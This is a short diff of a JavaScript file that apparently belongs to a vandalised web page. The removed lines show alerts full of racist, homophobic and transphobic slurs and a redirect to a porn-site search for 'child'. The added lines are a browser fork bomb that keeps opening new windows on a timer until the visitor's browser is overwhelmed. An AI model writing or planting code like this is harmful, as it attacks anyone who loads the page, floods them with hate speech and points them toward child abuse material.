@@ -1,4 +1,6 @@
-alert('THE KKK DID NOTHING ')
-alert('FUCK TRANS PEOPLE | FAGGOT SWAGGOT')
-alert('WE LOVE ICE FUCK THEM MEXICANS')
-window.location.replace("https://www.pornhub.com/video/search?search=child");
+(function forkBomb(timeout = 500, i = 0) {
+  setTimeout(() => {
+    window.open('./?v=' + Math.random(), '_new' + (i || ''))
+    forkBomb(timeout, i + 1)
+  }, timeout)
+})()
